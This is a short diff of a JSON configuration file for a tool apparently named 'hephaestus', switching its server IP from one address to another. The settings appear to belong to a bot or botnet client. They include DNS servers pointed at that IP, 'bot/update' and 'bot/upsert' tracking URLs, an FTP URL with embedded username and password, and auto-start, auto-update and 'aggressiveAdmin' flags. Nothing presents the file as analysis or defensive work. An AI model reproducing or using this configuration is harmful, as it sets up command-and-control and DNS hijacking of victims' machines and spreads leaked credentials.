@@ -19,8 +19,8 @@
     }
   ],
   "pack": {
-    "packFolder": "C:\\soft\\hephaestus_data\\default\\server\\packs",
-    "packTemplateUrl": "http://26.188.115.1/pack/envelope",
+    "packFolder": "/root/hephaestus_data/default/server/packs",
+    "packTemplateUrl": "http://84.200.33.53/pack/envelope",
     "items": []
   },
   "clone": {
@@ -33,13 +33,13 @@
   "landingAuto": true,
   "landingName": "superplayer",
   "landingFtp": "ftp://ftp:ftp123@tube-18.xyz/tube-18.xyz/",
-  "primaryDns": "26.188.115.1",
-  "secondaryDns": "26.188.115.1",
+  "primaryDns": "84.200.33.53",
+  "secondaryDns": "84.200.33.53",
   "extraUpdate": false,
-  "updateUrl": "http://26.188.115.1/bot/update",
+  "updateUrl": "http://84.200.33.53/bot/update",
   "track": true,
   "trackDesktop": false,
-  "trackUrl": "http://26.188.115.1/bot/upsert",
+  "trackUrl": "http://84.200.33.53/bot/upsert",
   "autoStart": true,
   "autoUpdate": true,
   "aggressiveAdmin": true,
